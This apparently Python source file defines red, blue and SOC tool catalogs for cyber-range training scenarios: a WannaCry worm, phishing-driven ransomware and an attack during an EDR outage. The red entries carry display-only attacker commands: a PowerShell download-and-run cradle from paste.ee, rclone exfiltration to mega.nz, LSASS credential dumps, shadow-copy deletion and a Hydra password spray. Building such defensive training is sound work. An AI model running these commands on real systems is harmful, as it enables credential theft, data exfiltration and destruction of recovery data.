"""Per-team, per-scenario tool catalogs for the immersive workspaces.

A `Tool` is one thing a team can *do*. `kind` decides how the engine runs it:
  - "real" — executes a real tool against the Docker lab (via its `fire_action` FireSpec) and streams
    real output; also applies its topology `effect`.
  - "sim"  — a scripted attacker step (exploit/worm/encrypt): applies `effect` + prints `command_hint`
    as authentic synthetic terminal output. Never touches the lab.
  - "act"  — a Blue response (isolate/segment/patch/sinkhole/restore): mutates the topology; `mitigates`
    names the lever it bends.
  - "view" — a SOC investigation lens (zeek/suricata/splunk/…): surfaces telemetry, no state change.

`schema` = the fields the tool-workspace form renders (target range, host, vlan pair…). `unlocks_after`
gates the Red kill-chain so capabilities open up as prerequisites are met. The engine interprets
`effect`; the frontend renders `name/summary/does/how/outcome/schema/command_hint`.
"""
from __future__ import annotations

from dataclasses import dataclass, field


@dataclass(frozen=True)
class ToolField:
    key: str
    label: str
    type: str = "text"                 # text | select | host | hosts | vlanpair | alert
    options: tuple[tuple[str, str], ...] = ()   # (value, label) for select
    default: str = ""
    filter: str = ""                   # for host/hosts/alert: which subset (e.g. "vulnerable", "infected")

    def public(self) -> dict:
        return {"key": self.key, "label": self.label, "type": self.type,
                "options": [list(o) for o in self.options], "default": self.default, "filter": self.filter}


@dataclass(frozen=True)
class Tool:
    id: str
    team: str                          # red | blue | soc
    name: str
    stage: str
    kind: str                          # real | sim | act | view
    effect: str                        # engine effect key
    summary: str
    does: str = ""
    how: str = ""
    outcome: str = ""
    unlocks_after: tuple[str, ...] = ()
    fire_action: str = ""              # FireSpec action_id (real tools)
    command_hint: str = ""             # synthetic command shown for sim tools
    schema: tuple[ToolField, ...] = ()
    mitigates: str = ""                # blue lever
    once: bool = False

    def public(self, available: bool, reason: str = "") -> dict:
        return {
            "id": self.id, "team": self.team, "name": self.name, "stage": self.stage, "kind": self.kind,
            "summary": self.summary, "does": self.does, "how": self.how, "outcome": self.outcome,
            "fire_action": self.fire_action, "command_hint": self.command_hint,
            "mitigates": self.mitigates, "once": self.once,
            "schema": [f.public() for f in self.schema],
            "available": available, "reason": reason,
        }


def _scan_field() -> ToolField:
    return ToolField("scan", "Scan type", "select",
                     options=(("sn", "Host discovery (-sn)"), ("sv", "Service/version (-sV)"),
                              ("smb", "SMB scripts (--script smb-os-discovery)")), default="sn")


# ===========================================================================
#  W1 — WannaCry SMB worm
# ===========================================================================
_W1: list[Tool] = [
    # ---------------- RED ----------------
    Tool("nmap", "red", "Nmap", "Host Discovery", "real", "reveal_hosts",
         summary="Find live hosts on the reachable subnets.",
         does="Sweep the subnet for live hosts — the worm's first move.",
         how="Real nmap host-discovery sweep against the lab (T1046).",
         outcome="Reveals neighbours on the topology map and the SOC's first (quiet) scan signal.",
         fire_action="intrecon.network", command_hint="nmap -sn 10.0.0.0/24",
         schema=(ToolField("range", "Target range", "select",
                           options=(("subnet", "Local subnet (10.0.0.0/24)"), ("all", "All VLANs")), default="subnet"),
                 _scan_field())),
    Tool("netexec", "red", "NetExec (SMB Enum)", "SMB Enumeration", "real", "mark_vulnerable",
         summary="Find which hosts still speak vulnerable SMBv1.",
         does="Enumerate SMB and flag the legacy-SMBv1 (vulnerable) hosts + their shares.",
         how="Real NetExec SMB enumeration against the file target (T1018).",
         outcome="Vulnerable hosts turn amber — the worm's target list.",
         unlocks_after=("nmap",), fire_action="intrecon.identity_graph",
         command_hint="nxc smb 10.0.0.0/24 --shares"),
    Tool("eternalblue", "red", "EternalBlue", "Exploit", "sim", "exploit",
         summary="Exploit a vulnerable SMBv1 host for code execution.",
         does="Fire the SMBv1 exploit at a chosen vulnerable host.",
         how="Simulated (T1210) — success probability that emits an IDS exploit signature; no exploit code runs.",
         outcome="Target turns orange (exploited) — and lights up the loudest early SOC signal.",
         unlocks_after=("netexec",), command_hint="msf6 exploit(windows/smb/ms17_010_eternalblue) > run",
         schema=(ToolField("host", "Target host", "host", filter="exploitable"),)),
    Tool("payload", "red", "Payload Dropper", "Payload", "sim", "infect",
         summary="Drop and launch the worm payload.",
         does="Write the payload to the exploited host and execute it.",
         how="Simulated file-write + process spawn (T1059.003).",
         outcome="Host turns solid red (infected) — the worm is resident.",
         unlocks_after=("eternalblue",), command_hint="meterpreter > upload w1.bin && execute -f w1.bin",
         schema=(ToolField("host", "Target host", "host", filter="exploited"),)),
    Tool("persistence", "red", "Service Creator", "Persistence", "sim", "persist",
         summary="Survive reboot via a service/auto-run.",
         does="Register a service so the payload re-launches at boot.",
         how="Simulated service creation (T1543).",
         outcome="Host gains a persistence anchor — reimaging now required to clean it.",
         unlocks_after=("payload",), command_hint="sc create W1Persistence binPath= C:\\w1.bin start= auto"),
    Tool("dns_killswitch", "red", "DNS Query (Kill-switch)", "C2", "sim", "killswitch_check",
         summary="Perform the worm's kill-switch lookup.",
         does="Make the single hardcoded outbound check that decides continue-or-abort.",
         how="Simulated DNS/HTTP callback (T1071.001) to a newly-seen domain.",
         outcome="If the domain is unreachable, the worm commits to spreading + encrypting.",
         unlocks_after=("payload",), command_hint="nslookup iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com"),
    Tool("propagate", "red", "SMB Propagation Engine", "Lateral Movement", "sim", "start_propagation",
         summary="Unleash the worm — auto-spread across reachable SMBv1 hosts.",
         does="Each infected host scans + exploits reachable vulnerable neighbours, every tick.",
         how="Simulated population spread (T1021.002) gated by R-value + VLAN reachability.",
         outcome="The red zone expands across VLANs until contained, patched, segmented or sinkholed.",
         unlocks_after=("payload",), command_hint="[worm] scanning 445/tcp across reachable subnets…", once=True),
    Tool("shadow_delete", "red", "Shadow Copy Deletion", "Disable Recovery", "sim", "disable_recovery",
         summary="Wipe local recovery before encrypting.",
         does="Delete shadow copies + backup catalog on infected hosts.",
         how="Simulated (T1490) — high-fidelity ransomware precursor telemetry.",
         outcome="Local restore is gone; recovery now depends on offline backups.",
         unlocks_after=("payload",), command_hint="vssadmin delete shadows /all /quiet", once=True),
    Tool("ransomware", "red", "Ransomware Engine", "Impact", "sim", "encrypt",
         summary="Encrypt every infected host and demand ransom.",
         does="Encrypt files, rename to .locked, drop the ransom note + lock screen.",
         how="Simulated file-state flips (T1486) — no real cipher.",
         outcome="Infected hosts go black (impacted); the victim desktops show the ransom note.",
         unlocks_after=("shadow_delete",), command_hint="w1.bin --encrypt --ext .locked --note", once=True),

    # ---------------- BLUE ----------------
    Tool("edr_quarantine", "blue", "EDR Quarantine", "Contain", "act", "isolate",
         summary="Network-isolate a compromised host.",
         does="Quarantine a host at the EDR level — it stops spreading.",
         how="EDR network containment.", outcome="Host turns blue (contained) and leaves the spread set.",
         mitigates="isolate", schema=(ToolField("host", "Host", "host", filter="containable"),)),
    Tool("disable_smbv1", "blue", "Vuln Scanner + Disable SMBv1", "Eradicate", "act", "patch_hosts",
         summary="Remove SMBv1 from exposed hosts.",
         does="Disable the vulnerable service on chosen hosts.",
         how="GPO/config push.", outcome="Those hosts stop being targetable (vector removed).",
         mitigates="patch", schema=(ToolField("hosts", "Hosts", "hosts", filter="vulnerable"),)),
    Tool("segment", "blue", "Firewall Manager", "Contain", "act", "segment",
         summary="Sever a VLAN boundary on TCP/445.",
         does="Cut the inter-VLAN 445 edge so the worm can't cross.",
         how="Emergency segmentation — the single most effective W1 containment.",
         outcome="Caps the blast radius to already-infected VLANs.",
         mitigates="segment",
         schema=(ToolField("edge", "VLAN boundary", "select",
                          options=(("fin|hr", "Finance ↔ HR"), ("fin|srv", "Finance ↔ Server"),
                                   ("hr|srv", "HR ↔ Server")), default="fin|srv"),)),
    Tool("sinkhole", "blue", "DNS Manager (Sinkhole)", "Contain", "act", "sinkhole",
         summary="Sinkhole the kill-switch domain.",
         does="Point the kill-switch domain at a sinkhole so every host's check 'succeeds'.",
         how="DNS sinkhole / internal redirect.",
         outcome="Trips the kill switch fleet-wide — infected hosts go dormant, new encryption halts.",
         mitigates="sinkhole", once=True),
    Tool("wsus", "blue", "WSUS (Mass Patch)", "Eradicate", "act", "patch_all",
         summary="Patch SMBv1 across the whole fleet.",
         does="Disable SMBv1 everywhere at once.", how="Emergency WSUS/GPO rollout.",
         outcome="Removes the worm's vector fleet-wide — new infections stop.",
         mitigates="patch", once=True),
    Tool("restore", "blue", "Veeam (Restore)", "Recover", "act", "restore",
         summary="Restore an impacted host from clean backups.",
         does="Rebuild + restore an impacted host.", how="Restore from offline backups (only if preserved).",
         outcome="Impacted host returns to service (recovered).",
         mitigates="restore", schema=(ToolField("host", "Host", "host", filter="impacted"),)),

    # ---------------- SOC ----------------
    Tool("zeek", "soc", "Zeek", "Network Discovery", "view", "view",
         summary="Spot the port-445 scan fan-out.",
         does="Inspect network-flow for one-source-to-many TCP/445 scans.",
         how="Zeek conn logs / horizontal-scan heuristic.", outcome="Confirms early reconnaissance."),
    Tool("suricata", "soc", "Suricata", "Exploit", "view", "view",
         summary="See the SMB exploit signature.",
         does="Inspect IDS alerts for the SMBv1 exploit pattern.",
         how="Suricata signature match.", outcome="Highest-confidence early signal."),
    Tool("splunk", "soc", "Splunk", "Investigation", "view", "view",
         summary="Query the telemetry — 445 events, exploits, infected hosts.",
         does="Search the SIEM to scope the incident.", how="SPL over the event stream.",
         outcome="Builds the incident picture."),
    Tool("sysmon", "soc", "Sysmon", "Host Telemetry", "view", "view",
         summary="See host events — new services, shadow deletion, mass rename.",
         does="Inspect endpoint telemetry for persistence + ransomware precursors.",
         how="Sysmon process/file/registry events.", outcome="Catches the mid/late funnel tells."),
    Tool("threat_hunt", "soc", "Threat Hunting Console", "Hunt", "act", "hunt",
         summary="Reveal infected hosts that didn't alert.",
         does="Hunt IOCs/services to surface undetected footholds.",
         how="IOC + service-name sweep.", outcome="Reveals hidden infected hosts to the defenders."),
    Tool("soc_triage", "soc", "Triage Alert", "Triage", "act", "triage",
         summary="Disposition a new alert.",
         does="Classify and confirm a new alert.", how="Alert triage workflow.",
         outcome="Confirms a true positive, ready to escalate.",
         schema=(ToolField("alert", "Alert", "alert", filter="new"),)),
    Tool("soc_escalate", "soc", "Escalate to IR", "Escalate", "act", "escalate",
         summary="Declare an incident and hand to Blue.",
         does="Escalate a triaged alert — declares an incident on the affected host.",
         how="Incident declaration.", outcome="Hands Blue a scoped incident (containment bonus).",
         schema=(ToolField("alert", "Alert", "alert", filter="triaged"),)),
]


# ===========================================================================
#  R5 — Phishing-to-Encrypt ransomware
# ===========================================================================
_R5: list[Tool] = [
    # ---- RED ----
    Tool("gophish", "red", "GoPhish", "Phishing", "sim", "deliver_phish",
         summary="Send the weaponized email to j.harper.",
         does="Deliver a macro-enabled invoice to the Finance team.",
         how="Simulated spear phish (T1566.001).", outcome="Email delivered — waiting for victim execution.",
         command_hint="gophish > campaigns > launch 'Q4 Invoice'"),
    Tool("macro_exec", "red", "Office Macro", "Execution", "sim", "exploit",
         summary="Victim enables content — macro fires.",
         does="Macro drops PowerShell download cradle.", how="Simulated (T1204.002 → T1059.001).",
         outcome="WINWORD → cmd → powershell chain executes.",
         unlocks_after=("gophish",), command_hint="powershell.exe -enc [Base64Payload]"),
    Tool("schtask", "red", "Scheduled Task Creator", "Persistence", "sim", "persist",
         summary="Create persistence via scheduled task + process injection.",
         does="Install a recurring task that relaunches the beacon.", how="Simulated (T1053.005 + T1055.012).",
         outcome="Beacon survives reboot.", unlocks_after=("macro_exec",),
         command_hint="schtasks /create /tn WindowsUpdateCheck /sc minute /mo 15 /tr powershell.exe"),
    Tool("beacon", "red", "HTTPS Beacon", "C2", "sim", "c2_establish",
         summary="Beacon phones home over HTTPS.", does="C2 channel established via cloud-fronted HTTPS.",
         how="Simulated (T1071.001).", outcome="Hands-on-keyboard access to compromised host.",
         unlocks_after=("schtask",), command_hint="beacon> sleep 60 15"),
    Tool("bloodhound", "red", "BloodHound", "Discovery", "sim", "reveal_hosts",
         summary="Map the AD attack path.", does="LDAP enumeration of users, groups, admin paths.",
         how="Simulated (T1087.002 + T1083).", outcome="Full AD map — identifies svc_backup as over-privileged.",
         unlocks_after=("beacon",), command_hint="bloodhound-python -c All -d mediumcorp.local"),
    Tool("lsass_dump", "red", "Credential Dump", "Credential Access", "sim", "cred_dump",
         summary="Dump LSASS for domain credentials.", does="comsvcs.dll MiniDump on patient zero.",
         how="Simulated (T1003.001).", outcome="j.harper + svc_backup credentials harvested.",
         unlocks_after=("bloodhound",), command_hint="rundll32.exe comsvcs.dll, MiniDump 652 C:\\Temp\\debug.dmp full"),
    Tool("rdp_lateral", "red", "RDP Simulator", "Lateral Movement", "sim", "start_propagation",
         summary="RDP to FS01, BKP01, DC01 using svc_backup.", does="Lateral movement via stolen service account.",
         how="Simulated RDP (T1021.001).", outcome="Three high-value footholds in minutes.",
         unlocks_after=("lsass_dump",), command_hint="mstsc /v:FS01 /u:svc_backup", once=True),
    Tool("shadow_delete_r5", "red", "Shadow Copy Deletion", "Disable Recovery", "sim", "disable_recovery",
         summary="Delete shadow copies + disable backup service.", does="vssadmin + sc config on all footholds.",
         how="Simulated (T1490).", outcome="Recovery options eliminated.",
         unlocks_after=("rdp_lateral",), command_hint="vssadmin delete shadows /all /quiet", once=True),
    Tool("ransomware_r5", "red", "Ransomware Simulator", "Impact", "sim", "encrypt",
         summary="Encrypt files across all compromised hosts.", does="Deploy .locked ransomware.",
         how="Simulated (T1486).", outcome="File server + workstations encrypted. Ransom note deployed.",
         unlocks_after=("shadow_delete_r5",), command_hint="encryptor.exe --ext .locked --note", once=True),

    # ---- BLUE ----
    Tool("quarantine_r5", "blue", "EDR Quarantine", "Contain", "act", "isolate",
         summary="Isolate a compromised host.", does="Network quarantine via EDR.",
         how="EDR containment.", outcome="Host stops spreading.", mitigates="isolate",
         schema=(ToolField("host", "Host", "host", filter="containable"),)),
    Tool("disable_account", "blue", "Account Disable", "Contain", "act", "disable_cred",
         summary="Disable compromised accounts.", does="Disable svc_backup + j.harper in AD.",
         how="AD account disable.", outcome="Lateral movement using these creds stops.", mitigates="contain"),
    Tool("reset_passwords", "blue", "Password Reset", "Eradicate", "act", "reset_creds",
         summary="Force password reset for all compromised accounts.",
         does="Reset j.harper, svc_backup, and all domain admin passwords.",
         how="Bulk credential reset.", outcome="Stolen credentials invalidated.", mitigates="patch"),
    Tool("block_c2_r5", "blue", "Firewall / DNS Block", "Contain", "act", "sinkhole",
         summary="Block the C2 domain.", does="Block cdn-assets-update.azurewebsites.net at proxy + DNS.",
         how="Proxy block + DNS sinkhole.", outcome="Beacon loses connectivity.", mitigates="sinkhole", once=True),
    Tool("segment_r5", "blue", "Network Segmentation", "Contain", "act", "segment",
         summary="Segment server VLAN from corporate.", does="Block RDP/SMB between VLANs.",
         how="Firewall rule push.", outcome="Prevents further lateral movement.", mitigates="segment",
         schema=(ToolField("edge", "VLAN boundary", "select",
                          options=(("fin|srv", "Finance ↔ Server"), ("corp|srv", "Corp ↔ Server"),
                                   ("it|srv", "IT ↔ Server")), default="fin|srv"),)),
    Tool("restore_r5", "blue", "Backup Recovery", "Recover", "act", "restore",
         summary="Restore from backup.", does="Restore encrypted hosts from clean backups.",
         how="Veeam restore (if backups survive).", outcome="Host recovered.",
         mitigates="restore", schema=(ToolField("host", "Host", "host", filter="impacted"),)),
    Tool("declare_ir", "blue", "Incident Declaration", "Respond", "act", "escalate",
         summary="Declare P1 incident.", does="Activate IR plan, notify leadership.",
         how="IR management console.", outcome="Coordinated response begins.", mitigates="early_detect", once=True),

    # ---- SOC ----
    Tool("email_gateway", "soc", "Email Gateway Logs", "Detection", "view", "view",
         summary="Check email gateway for the phishing delivery."),
    Tool("sysmon_r5", "soc", "Sysmon", "Detection", "view", "view",
         summary="Inspect process chains for macro execution."),
    Tool("edr_alerts", "soc", "EDR Alerts", "Detection", "view", "view",
         summary="Review EDR detections (LSASS access, RDP anomalies)."),
    Tool("splunk_r5", "soc", "SIEM Timeline", "Investigation", "view", "view",
         summary="Build the incident timeline from all sources."),
    Tool("hunt_r5", "soc", "Threat Hunting", "Hunt", "act", "hunt",
         summary="Hunt IOCs across all endpoints.", does="Search for beacon hashes + scheduled task names.",
         how="IOC sweep.", outcome="Reveals undetected footholds."),
    Tool("triage_r5", "soc", "Triage Alert", "Triage", "act", "triage",
         summary="Triage incoming alert.", schema=(ToolField("alert", "Alert", "alert", filter="new"),)),
    Tool("escalate_r5", "soc", "Escalate to IR", "Escalate", "act", "escalate",
         summary="Escalate to Blue team.", schema=(ToolField("alert", "Alert", "alert", filter="triaged"),)),
]

# ===========================================================================
#  C5 — EDR Outage Exploitation
# ===========================================================================
_C5: list[Tool] = [
    # ---- RED ----
    Tool("osint", "red", "Shodan / OSINT", "Reconnaissance", "sim", "reveal_hosts",
         summary="Monitor for EDR outage signals.", does="Scan vendor status pages, social media.",
         how="Simulated (T1592).", outcome="Target list compiled — outage confirmed.",
         command_hint="shodan search 'edr outage globaltech'"),
    Tool("password_spray", "red", "Hydra (Password Spray)", "Initial Access", "real", "spray",
         summary="Spray common passwords across 200 accounts.", does="Try 3 passwords per account.",
         how="Simulated (T1110.003).", outcome="5 accounts compromised.",
         unlocks_after=("osint",), fire_action="access.valid_creds",
         command_hint="hydra -L users.txt -P top3.txt rdp://vpn.globaltech.com"),
    Tool("vpn_access", "red", "VPN Access", "Initial Access", "sim", "exploit",
         summary="Establish VPN with stolen credentials.", does="Connect via Tor exit node.",
         how="Simulated (T1133 + T1078).", outcome="Inside the corporate network.",
         unlocks_after=("password_spray",), command_hint="openvpn --config globaltech.ovpn --auth-user-pass creds.txt"),
    Tool("custom_tools", "red", "Custom Tooling", "Execution", "sim", "infect",
         summary="Deploy PsExec + credential dumper.", does="Drop tools in C:\\ProgramData.",
         how="Simulated (T1059.001).", outcome="Attacker toolkit deployed — EDR would catch this but it's down.",
         unlocks_after=("vpn_access",), command_hint="powershell IEX(IWR paste.ee/r/abc123)"),
    Tool("ad_recon", "red", "BloodHound", "Discovery", "sim", "reveal_hosts",
         summary="Map AD attack paths.", does="Bulk LDAP enumeration.",
         how="Simulated (T1087.002).", outcome="All admin accounts, groups, trust paths mapped.",
         unlocks_after=("custom_tools",), command_hint="bloodhound-python -c All -d globaltech.com"),
    Tool("procdump", "red", "Credential Dump (LSASS)", "Credential Access", "sim", "cred_dump",
         summary="Dump LSASS with procdump.", does="Extract domain admin credentials.",
         how="Simulated (T1003.001).", outcome="Domain Admin creds harvested — EDR signature would fire but it's offline.",
         unlocks_after=("ad_recon",), command_hint="procdump.exe -ma lsass.exe lsass_dump.dmp"),
    Tool("psexec_spread", "red", "PsExec Lateral", "Lateral Movement", "sim", "start_propagation",
         summary="PsExec to 43 servers using Domain Admin.", does="Mass lateral movement.",
         how="Simulated (T1021.002 + T1569.002).", outcome="47 authentications across 43 hosts in 12 minutes.",
         unlocks_after=("procdump",), command_hint="psexec \\\\SRV-DB01 -u DA -p [hash] cmd.exe", once=True),
    Tool("rclone_exfil", "red", "Rclone Exfiltration", "Exfiltration", "sim", "exfiltrate",
         summary="Exfiltrate 200GB to mega.nz.", does="Stage + upload sensitive data.",
         how="Simulated (T1048.003).", outcome="Customer PII, financial records, IP stolen.",
         unlocks_after=("psexec_spread",), command_hint="rclone copy \\\\FS01\\HR-Confidential mega:exfil/", once=True),
    Tool("shadow_delete_c5", "red", "Recovery Disable", "Disable Recovery", "sim", "disable_recovery",
         summary="Delete shadow copies + disable backup agents.", does="vssadmin + sc config across 43 hosts.",
         how="Simulated (T1490).", outcome="Recovery mechanisms eliminated.",
         unlocks_after=("psexec_spread",), command_hint="wmic /node:@hostlist.txt process call create 'vssadmin delete shadows /all'", once=True),
    Tool("gpo_ransomware", "red", "GPO Ransomware Deploy", "Impact", "sim", "encrypt",
         summary="Deploy ransomware via Group Policy.", does="Push encryptor to all domain-joined hosts.",
         how="Simulated (T1486).", outcome="300+ hosts encrypt simultaneously. Screens go dark.",
         unlocks_after=("shadow_delete_c5",), command_hint="New-GPO 'WindowsUpdate' | Set-GPLink", once=True),

    # ---- BLUE ----
    Tool("force_mfa", "blue", "MFA Enforcement", "Contain", "act", "disable_cred",
         summary="Emergency MFA for all remote access.", does="Block password-only auth.",
         how="Azure MFA conditional access.", outcome="Sprayed credentials useless without second factor.", mitigates="patch", once=True),
    Tool("kill_vpn", "blue", "Kill VPN Session", "Contain", "act", "isolate",
         summary="Terminate suspicious VPN session.", does="Disconnect m.chen's VPN from Tor exit node.",
         how="VPN gateway admin.", outcome="Attacker loses network access.", mitigates="isolate",
         schema=(ToolField("host", "Host", "host", filter="containable"),)),
    Tool("disable_da", "blue", "Disable Domain Admin", "Contain", "act", "disable_cred",
         summary="Disable compromised Domain Admin account.", does="AD account disable + krbtgt reset.",
         how="AD admin.", outcome="Lateral movement stops.", mitigates="contain"),
    Tool("segment_c5", "blue", "Network Segmentation", "Contain", "act", "segment",
         summary="Emergency segment server farm.", does="Block SMB/RDP between corporate and servers.",
         how="NAC/firewall push.", outcome="Blast radius capped.", mitigates="segment",
         schema=(ToolField("edge", "VLAN boundary", "select",
                          options=(("corp|srv", "Corp ↔ Servers"), ("corp|dc", "Corp ↔ DCs"),
                                   ("srv|data", "Servers ↔ Data"), ("dc|bkp", "DCs ↔ Backup")), default="corp|srv"),)),
    Tool("block_egress", "blue", "Block Cloud Upload", "Contain", "act", "sinkhole",
         summary="Block file-sharing sites at proxy.", does="Block mega.nz, dropbox, etc.",
         how="Proxy/firewall block.", outcome="Exfiltration channel cut.", mitigates="sinkhole", once=True),
    Tool("offline_backup", "blue", "Offline Backup Isolation", "Protect", "act", "protect_backup",
         summary="Disconnect backup infrastructure.", does="Air-gap BKP-SRV01 and BKP-SRV02.",
         how="Physical/network disconnect.", outcome="Backups survive even if everything else is encrypted.", mitigates="restore", once=True),
    Tool("alt_monitoring", "blue", "Sysmon (Alternate Monitoring)", "Detect", "act", "alt_detect",
         summary="Increase Sysmon/auth log alerting.", does="Compensate for EDR outage with alternative sources.",
         how="Sysmon + Windows Event Forwarding.", outcome="Partial visibility restored.", mitigates="early_detect", once=True),
    Tool("restore_c5", "blue", "Backup Recovery", "Recover", "act", "restore",
         summary="Restore impacted hosts.", does="Rebuild from offline backups.",
         how="Restore from air-gapped backup.", outcome="Hosts recovered.", mitigates="restore",
         schema=(ToolField("host", "Host", "host", filter="impacted"),)),

    # ---- SOC ----
    Tool("auth_logs", "soc", "Azure AD Logs", "Detection", "view", "view",
         summary="Monitor authentication anomalies — password spray pattern."),
    Tool("vpn_logs", "soc", "VPN Log Analyzer", "Detection", "view", "view",
         summary="Check VPN connections for impossible travel."),
    Tool("netflow_c5", "soc", "Zeek / NetFlow", "Investigation", "view", "view",
         summary="Network flow analysis — lateral SMB traffic."),
    Tool("proxy_logs", "soc", "Proxy Analyzer", "Investigation", "view", "view",
         summary="Inspect outbound traffic — rclone to mega.nz."),
    Tool("dlp_console", "soc", "DLP Console", "Investigation", "view", "view",
         summary="Data loss prevention alerts — 200GB outbound."),
    Tool("splunk_c5", "soc", "SIEM", "Investigation", "view", "view",
         summary="Correlate all sources — build the incident timeline."),
    Tool("hunt_c5", "soc", "Threat Hunting", "Hunt", "act", "hunt",
         summary="Hunt for attacker tools across all endpoints.",
         does="Search for procdump, PsExec service, rclone.", how="IOC sweep.", outcome="Reveals compromised hosts."),
    Tool("triage_c5", "soc", "Triage Alert", "Triage", "act", "triage",
         summary="Triage incoming alert.", schema=(ToolField("alert", "Alert", "alert", filter="new"),)),
    Tool("escalate_c5", "soc", "Escalate to IR", "Escalate", "act", "escalate",
         summary="Declare incident.", schema=(ToolField("alert", "Alert", "alert", filter="triaged"),)),
]

CATALOGS: dict[str, list[Tool]] = {
    "scn-wannacry-w1": _W1,
    "scn-r5-phishing": _R5,
    "scn-c5-edr": _C5,
}


def catalog(scenario_id: str) -> list[Tool]:
    return CATALOGS.get(scenario_id, [])


def by_id(scenario_id: str) -> dict[str, Tool]:
    return {t.id: t for t in catalog(scenario_id)}
